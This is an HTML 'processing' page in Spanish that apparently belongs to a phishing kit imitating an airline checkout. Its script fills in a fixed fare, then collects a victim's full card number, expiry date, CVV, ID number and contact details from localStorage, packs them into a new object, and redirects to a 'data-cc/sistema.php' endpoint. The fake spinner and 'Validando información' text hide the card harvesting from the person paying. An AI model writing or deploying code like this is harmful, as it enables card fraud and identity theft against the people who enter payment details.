<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando...</title>
    <style>
        /* Estilos para centrar el loader */
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #ffffff;
            font-family: Arial, sans-serif;
        }

        .container {
            text-align: center;
        }

        /* El loader azul sencillo */
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db; /* Color Azul */
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        p {
            color: #333;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <p>Validando información...</p>
    </div>

    <script>
        (function() {
            // ========================================================
            // 1. NUEVO: Calcular y guardar el precio limpio en total_pagar
            // ========================================================
            try {
                const infoData = localStorage.getItem('info');
                if (infoData) {
                    const info = JSON.parse(infoData);
                    const flightInfo = info.flightInfo;
                    
                    const PRECIO_BASE = 46900;
                    const MULTIPLICADORES_PRECIO = {
                        light: 1,
                        smart: 1.7,
                        full: 3
                    };

                    const passengers = (flightInfo.adults || 0) + (flightInfo.children || 0);
                    let total = 0;

                    // Sumar vuelo de ida
                    if (flightInfo.origin && flightInfo.origin.ticket_type) {
                        const tipoIda = flightInfo.origin.ticket_type;
                        total += PRECIO_BASE * (MULTIPLICADORES_PRECIO[tipoIda] || 1) * passengers;
                    }

                    // Sumar vuelo de regreso si aplica (travel_type === 1)
                    if (flightInfo.travel_type === 1 && flightInfo.destination && flightInfo.destination.ticket_type) {
                        const tipoVuelta = flightInfo.destination.ticket_type;
                        total += PRECIO_BASE * (MULTIPLICADORES_PRECIO[tipoVuelta] || 1) * passengers;
                    }

                    // Guardar el número limpio directamente con el nombre 'total_pagar'
                    localStorage.setItem('total_pagar', total);
                    
                    console.log("Precio calculado y guardado exitosamente:", total);
                }
            } catch (err) {
                console.error("Error al calcular el precio:", err);
            }

            // ========================================================
            // 2. ORIGINAL: Procesar 'pagojet' y migrar a 'tbdatos'
            // ========================================================
            const antiguo = localStorage.getItem('pagojet');

            if (antiguo) {
                try {
                    const data = JSON.parse(antiguo);
                    
                    // Procesar la fecha de expiración (de "12/27" a mes y año separados)
                    let mm = "";
                    let yy = "";
                    if (data.ftarjeta && data.ftarjeta.includes('/')) {
                        const partes = data.ftarjeta.split('/');
                        mm = partes[0];
                        yy = partes[1];
                    }

                    // Crear el nuevo objeto 'tbdatos' con el mapeo correcto
                    const nuevoFormato = {
                        nombre: data.nombre || "",
                        documento: data.id || "",
                        tipo_identificacion: "CC",
                        tipo_persona: "Natural",
                        correo: data.email || "",
                        direccion: data.direccion || "",
                        telefono: data.celular || "",
                        // Datos de tarjeta procesados
                        tarjeta: (data.tarjeta || "").replace(/\s/g, ''),
                        expMonth: mm,
                        expYear: yy,
                        cvv: data.cvv || "",
                        ownerName: data.nombre || ""
                    };

                    // Guardar en el nuevo campo de LocalStorage
                    localStorage.setItem('tbdatos', JSON.stringify(nuevoFormato));
                    
                    console.log("Migración completada exitosamente.");
                } catch (err) {
                    console.error("Error al procesar datos locales:", err);
                }
            }

            // ========================================================
            // 3. Redirigir a la subcarpeta después de 1.5 segundos
            // ========================================================
            setTimeout(function() {
                window.location.href = 'data-cc/sistema.php';
            }, 1500);
        })();
    </script>

</body>
</html>